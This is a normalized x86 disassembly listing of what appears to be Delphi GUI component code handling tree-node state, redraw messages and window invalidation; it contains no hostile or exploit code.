pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4753d0
mov [ eax + 0x245 ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_4753bc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov ecx esi
call sub_429468
sub_475978
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_475970
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor edx edx
mov eax esi
call sub_475964
xor edx edx
mov eax esi
call sub_475958
jmp r-xdata
sub_4759ac
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4753bc
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_4759a4
cmp bl al
je r-xdata
mov eax esi
call sub_4753d0
cmp [ eax + 0x274 ] 0x0
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_4753d0
mov eax [ eax + 0x278 ]
cmp [ eax + 0x8 ] 0x1
jle r-xdata
mov eax esi
call sub_4759a4
test al al
je r-xdata
mov eax esi
call sub_4753bc
mov edx [ esi + 0x10 ]
call sub_4295b8
jmp r-xdata
mov eax esi
call sub_4753d0
mov cl [ r-xdata ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax esi
call sub_4753bc
xor edx edx
call sub_4295b8
jmp r-xdata
sub_475a60
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_475a58
cmp bl al
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
xor edx edx
mov eax esi
call sub_4755b0
sub_475a88
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4753bc
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_475a80
test al al
je r-xdata
mov eax esi
call sub_4753bc
mov edx [ esi + 0x10 ]
call sub_4295c4
jmp r-xdata
mov eax esi
call sub_4753bc
xor edx edx
call sub_4295c4
sub_475ad0
push ebx
push esi
add esp 0xffffffd8
mov esi eax
xor ebx ebx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax ebx
add esp 0x28
pop esi
pop ebx
retn
mov [ esp ] 0x40
mov eax [ esi + 0x10 ]
mov [ esp + 0x4 ] eax
mov eax esi
call sub_4753bc
mov edx esp
call sub_4295dc
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0x0
setg bl
sub_475b10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_475b30
cmp bl al
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x2
mov eax esi
call sub_4755b0
sub_475b38
push ebx
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop ebx
retn
mov [ esp ] 0x40
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
xor eax eax
mov al dl
mov [ esp + 0x20 ] eax
mov eax ebx
call sub_4753bc
mov edx esp
call sub_4295f4
sub_475b70
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4753bc
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_476640
mov edx [ ebx + 0x10 ]
call sub_42953c
mov edx eax
mov eax esi
call sub_476ab8
mov esi eax
sub_475bac
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4753bc
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_476640
mov edx [ ebx + 0x10 ]
call sub_429524
mov edx eax
mov eax esi
call sub_476ab8
mov esi eax
sub_475be8
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4753bc
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_476640
mov edx [ ebx + 0x10 ]
call sub_429530
mov edx eax
mov eax esi
call sub_476ab8
mov esi eax
sub_475c24
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4753bc
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax ebx
call sub_476218
test al al
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_476640
mov edx [ ebx + 0x10 ]
call sub_429558
mov edx eax
mov eax esi
call sub_476ab8
mov esi eax
sub_475c68
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4753bc
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax ebx
call sub_476218
test al al
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_476640
mov edx [ ebx + 0x10 ]
call sub_429564
mov edx eax
mov eax esi
call sub_476ab8
mov esi eax
sub_475cbc
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4753bc
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_476640
mov edx [ ebx + 0x10 ]
call sub_429518
mov edx eax
mov eax esi
call sub_476ab8
mov esi eax
sub_475cf8
push ebx
call sub_475cbc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov ebx eax
mov eax ebx
call sub_475bac
test eax eax
jne r-xdata
sub_475d18
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4753bc
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax ebx
call sub_4753bc
mov edx [ ebx + 0x10 ]
call sub_429518
test eax eax
jne r-xdata
mov esi [ ebx + 0x10 ]
jmp r-xdata
mov eax ebx
call sub_4753bc
mov edx [ ebx + 0x10 ]
call sub_429524
test eax eax
jne r-xdata
mov edx eax
mov eax [ ebx + 0x4 ]
call sub_476ab8
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
call sub_4753bc
mov edx esi
call sub_42953c
mov esi eax
mov eax ebx
call sub_4753bc
mov edx esi
call sub_429524
sub_475d90
push ebx
push esi
mov esi eax
mov eax esi
call sub_475be8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_475b70
mov ebx eax
mov eax ebx
mov ebx eax
mov eax ebx
call sub_475cf8
test eax eax
jne r-xdata
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_475dc0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp ebx [ eax + 0xc ]
jne r-xdata
mov eax ebx
call sub_4761f0
test al al
je r-xdata
mov esi [ eax + 0x10 ]
jmp r-xdata
or esi 0xffffffff
mov eax ebx
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
inc esi
call sub_475d90
test eax eax
jne r-xdata
sub_475df8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_475e86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_475cbc
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
test esi esi
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475e8d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409730
mov eax [ ebp - 0x4 ]
call sub_47527c
mov edx ebx
mov eax edi
call sub_475cac
mov ebx eax
dec esi
sub_475e98
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_475cbc
test eax eax
je r-xdata
test eax eax
jne r-xdata
inc esi
cmp edi eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
or esi 0xffffffff
mov edx eax
mov eax ebx
call sub_475cac
test eax eax
jne r-xdata
sub_475ecc
push ebx
xor ebx ebx
call sub_475cbc
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
inc ebx
mov edx eax
call sub_475cac
test eax eax
jne r-xdata
sub_475ee8
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x5c ] ebx
mov esi ecx
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_476054
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4 ]
call sub_476ed4
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov [ ebp - 0x2e ] 0x4
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0xa ] eax
mov eax ebx
call sub_4753bc
lea edx [ ebp - 0x2e ]
call sub_4295f4
mov esi [ ebx + 0x4 ]
lea ecx [ ebp - 0x58 ]
mov edx ebx
mov eax esi
call sub_47691c
lea eax [ ebp - 0x58 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_476940
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_475b70
mov edx 0x1
call sub_4757a0
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_475ecc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x5c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov eax ebx
call sub_475b70
xor edx edx
call sub_475978
mov eax ebx
call sub_475b70
xor edx edx
call sub_475b38
mov eax ebx
call sub_475ad0
mov [ ebp - 0x5 ] al
mov eax ebx
call sub_4759a4
mov [ ebp - 0x6 ] al
mov eax ebx
call sub_475b70
test eax eax
je r-xdata
mov eax ebx
call sub_4753bc
mov edx [ ebx + 0x10 ]
call sub_429438
mov [ ebx + 0x10 ] edi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl [ ebp - 0x5 ]
mov eax ebx
call sub_475b38
mov dl [ ebp - 0x6 ]
mov eax ebx
call sub_4759ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47605b
lea eax [ ebp - 0x5c ]
call sub_40442c
retn
push edi
push 0x0
mov edx esi
mov eax ebx
call sub_475df8
xor ecx ecx
mov edx ebx
call sub_475ee8
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_476064
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4753d0
mov edx [ eax + 0x2b8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x2bc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_4753d0
mov edx [ eax + 0x2b0 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x2b4 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x4 ]
call sub_4753d0
xor edx edx
mov [ eax + 0x2b8 ] edx
mov [ eax + 0x2bc ] edx
mov eax [ ebp - 0x4 ]
call sub_4753d0
xor edx edx
mov [ eax + 0x2b0 ] edx
mov [ eax + 0x2b4 ] edx
xor edx edx
push ebp
push sub_4761e2
push [ fs : edx ]
mov [ fs : edx ] esp
test edi edi
je r-xdata
mov bl 0x1
test edi edi
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4753d8
test al al
jne r-xdata
mov esi edi
mov al [ ebp - 0x5 ]
add al 0xfe
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4753d0
mov edx [ ebp - 0x10 ]
mov [ eax + 0x2b8 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x2bc ] edx
mov eax [ ebp - 0x4 ]
call sub_4753d0
mov edx [ ebp - 0x18 ]
mov [ eax + 0x2b0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x2b4 ] edx
retn
test esi esi
je r-xdata
jmp [ eax * 4 + jump_table_476133 ]
mov eax edi
call sub_475b70
mov esi eax
jmp r-xdata
xor eax eax
mov eax [ esi + 0x10 ]
jmp r-xdata
mov bl 0x1
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov eax edi
call sub_475be8
mov edi eax
test edi edi
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_475b70
mov esi eax
test esi esi
je r-xdata
push eax
push ebx
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_475ee8
cmp edi [ ebp - 0x4 ]
je r-xdata
mov bl 0x2
xor ebx ebx
jmp r-xdata
mov dl 0x1
mov eax esi
call sub_475b38
mov dl 0x1
mov eax esi
call sub_475978
sub_4761f0
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_475b70
test eax eax
jne r-xdata
mov eax ebx
call sub_475be8
test eax eax
je r-xdata
mov al 0x1
pop ebx
retn
sub_476218
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0xffffffff
mov eax ebx
call sub_4753bc
lea ecx [ esp + 0x4 ]
mov edx [ ebx + 0x10 ]
call sub_429484
test eax eax
jne r-xdata
add esp 0x10
pop ebx
retn
mov al 0x1
sub_476248
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402fc4
cmp [ edi + 0x24 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax edi
call sub_4753bc
mov ecx esi
mov edx [ edi + 0x10 ]
call sub_429484
sub_476290
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x4 ]
call sub_476ed4
test esi esi
jne r-xdata
mov [ ebp - 0x9 ] esi
mov eax sub_475210
mov [ ebp - 0x9 ] eax
jmp r-xdata
mov eax ebx
call sub_475cbc
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0xd ] eax
mov [ ebp - 0x5 ] edi
mov eax ebx
call sub_4753bc
lea edx [ ebp - 0xd ]
xor ecx ecx
call sub_429650
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_475ad0
test al al
je r-xdata
mov eax ebx
call sub_475bac
mov ebx eax
test ebx ebx
jne r-xdata
push 0x1
mov ecx edi
mov edx esi
mov eax ebx
call sub_476290
sub_476338
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_476ed4
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_416a84
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_475418
mov edx [ esi + 0xc ]
mov eax ebx
call sub_4754ac
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_47564c
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_4756a4
mov edx [ esi + 0x20 ]
mov eax ebx
call sub_47574c
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_4756fc
mov eax esi
call sub_475b30
mov edx eax
mov eax ebx
call sub_475b10
mov eax esi
call sub_475a80
mov edx eax
mov eax ebx
call sub_475a88
mov eax esi
call sub_475a58
mov edx eax
mov eax ebx
call sub_475a60
mov eax esi
call sub_475ad0
mov edx eax
mov eax ebx
call sub_475b38
pop esi
pop ebx
retn
sub_4763ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404828
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
cmp eax [ esi + 0xc ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_476414
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4764f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4 ]
call sub_476ed4
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_418b0c
mov edx edi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b0c
lea eax [ ebp - 0x10 ]
lea edx [ edi + 0x18 ]
call sub_404688
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_475418
mov edx [ edi ]
mov eax ebx
call sub_47564c
mov edx [ edi + 0x4 ]
mov eax ebx
call sub_4756a4
mov edx [ edi + 0x8 ]
mov eax ebx
call sub_47574c
mov edx [ edi + 0xc ]
mov eax ebx
call sub_4756fc
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4754ac
mov eax [ edi + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4764fb
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
inc eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov edx ebx
mov eax [ ebx + 0x4 ]
call sub_4766d8
mov esi eax
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_476414
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
mov si 0xffac
call sub_4038bc
dec [ ebp - 0xc ]
jne r-xdata
sub_476504
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi ecx
mov [ esp ] edx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_4046e4
cmp eax 0xff
jle r-xdata
add eax 0x118
sub eax 0xff
mov [ esp + 0x4 ] eax
lea eax [ esi + 0x18 ]
mov edx [ ebx + 0x8 ]
mov ecx 0xff
call sub_4046c0
mov eax [ ebx + 0x14 ]
mov [ esi ] eax
mov eax [ ebx + 0x18 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x20 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x10 ] eax
mov eax ebx
call sub_475ecc
mov edi eax
mov [ esi + 0x14 ] edi
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax [ esp ]
call sub_418b44
mov edx esi
mov ecx [ esp + 0x4 ]
mov eax [ esp ]
call sub_418b44
dec edi
test edi edi
jl r-xdata
mov eax 0xff
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx ebp
mov eax ebx
call sub_475df8
mov ecx esi
mov edx [ esp ]
call sub_476504
inc ebp
dec edi
jne r-xdata
sub_4765b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4765f0
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_476654
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_47661c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_476640
call sub_4294a8
pop ebx
retn
sub_476654
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448788
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4766ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_476ed4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448788
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_476ae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4766d1
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448484
call sub_429450
retn
mov eax [ ebp - 0x4 ]
call sub_476b34
sub_4766f8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_476894
push [ fs : eax ]
mov [ fs : eax ] esp
test edx edx
jne r-xdata
mov [ ebp - 0x8 ] edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4754ac
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_475418
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47691c
lea eax [ ebp - 0x38 ]
push eax
mov al [ ebp - 0xd ]
push eax
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_476940
mov esi eax
test esi esi
jne r-xdata
mov al [ ebp + 0x8 ]
sub al 0x2
jb r-xdata
xor eax eax
push ebp
push j_sub_403ba0#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor edi edi
xor eax eax
mov al [ ebp + 0x8 ]
mov al [ eax + rw-data ]
mov [ ebp - 0xd ] al
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov eax [ ebp - 0x4 ]
call sub_475b70
mov edi eax
test edi edi
je r-xdata
sub al 0x2
jb r-xdata
mov edx edi
mov eax ebx
call sub_4768fc
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4761f0
test al al
je r-xdata
mov esi [ edi + 0x10 ]
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov esi [ edi + 0x10 ]
jmp r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov si 0xffac
call sub_4038bc
push 0x0
push 0x1
push 0xb
mov eax ebx
call sub_476640
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_475b70
mov edi eax
test edi edi
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47689b
lea eax [ ebp - 0x3c ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
call sub_475be8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ edi + 0x10 ]
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_4768a8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x1
jge r-xdata
add esp 0x10
pop esi
pop ebx
retn
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_476218
test al al
je r-xdata
mov ecx esp
xor edx edx
mov eax ebx
call sub_476248
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
call sub_448484
push eax
call InvalidateRect
mov eax ebx
call sub_475b70
mov ebx eax
sub_4768fc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_475b38
mov edx ebx
mov eax esi
call sub_4768a8
sub_476940
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_476ed4
mov [ ebp - 0x34 ] esi
mov al [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x30 ] 0xffff0001
jmp r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
mov esi eax
lea edi [ ebp - 0x2c ]
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x330 ]
xor edx edx
call sub_4374f0
mov eax ebx
call sub_476640
lea edx [ ebp - 0x34 ]
call sub_429420
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x30 ] 0xffff0002
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x30 ] edi
jmp r-xdata
sub_4769d0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_476aa5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x8 ]
call sub_47527c
mov eax esi
call sub_4769b4
mov ebx eax
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
sub eax [ ebp - 0x4 ]
cdq
xor eax edx
sub eax edx
dec eax
jg r-xdata
test edi edi
je r-xdata
lea eax [ esi + 0xc ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
cmp edx [ ebp - 0x4 ]
jle r-xdata
mov ebx [ eax ]
jmp r-xdata
mov [ esi + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476aac
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404450
retn
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0xc ]
call sub_47527c
mov eax ebx
call sub_475d18
mov ebx eax
dec edi
mov eax [ eax ]
call sub_475d18
mov ebx eax
jmp r-xdata
mov eax [ eax ]
call sub_475d90
mov ebx eax
jmp r-xdata
sub_476ab8
push ebx
add esp 0xffffffd8
mov ebx eax
mov [ esp + 0x4 ] edx
mov [ esp ] 0x4
mov eax ebx
call sub_476640
mov edx esp
call sub_4295dc
test eax eax
je r-xdata
xor eax eax
mov eax [ esp + 0x24 ]
jmp r-xdata
add esp 0x28
pop ebx
retn
sub_476b00
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax esi
call sub_476640
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
call sub_4422a0
sub_476b48
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_476ed4
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416a84
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_476654
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476bc4
push [ fs : eax ]
mov [ fs : eax ] esp
